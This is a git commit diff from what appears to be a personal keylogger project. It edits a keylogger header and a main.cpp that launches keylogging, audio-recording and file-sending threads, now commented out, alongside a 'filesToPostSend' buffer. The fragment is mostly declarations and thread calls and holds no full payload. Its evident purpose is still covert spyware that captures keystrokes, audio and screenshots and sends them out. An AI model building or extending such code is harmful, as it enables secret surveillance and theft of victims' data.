1d62ef37fc24240c1e39a780778e9ca5ea481dc3
Ilias TRAGHA <104205016+BDF172@users.noreply.github.com>
2023-11-17 19:01:21 +0100

    Removed some useless header content

--- headers/keylogger.hpp
+++ headers/keylogger.hpp
@@ -2,10 +2,7 @@
 #define KEYLOGGER_HPP
 
 void log();
-std::string trouverNomFichier(std::string typeFichier);
-void screenshot();
 void afficherNumero();
-std::string stringedBuffer(char* buffer, int* bufferLevel);
 std::string trouverNomFichierTxt();
 
 #endif
--- main.cpp
+++ main.cpp
@@ -5,11 +5,14 @@ using namespace std;
 atomic<std::string *>filesToPostSend((string *)(new string));
 
 int main(){
-    HANDLE audioThread, keyloggerThread, fileSendThread;
-    DWORD audioThreadId, keyloggerThreadId, fileSendThreadId;
-    beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
-    beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
-    beginfileSendingThread(fileSendThread, reinterpret_cast<LPDWORD>(&fileSendThreadId));
-    WaitForSingleObject(audioThread, INFINITE);
+    // HANDLE audioThread, keyloggerThread, fileSendThread;
+    // DWORD audioThreadId, keyloggerThreadId, fileSendThreadId;
+    // beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
+    // beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
+    // beginfileSendingThread(fileSendThread, reinterpret_cast<LPDWORD>(&fileSendThreadId));
+    // WaitForSingleObject(audioThread, INFINITE);
+
+    afficherNumero();
+    
     return 0;
 }
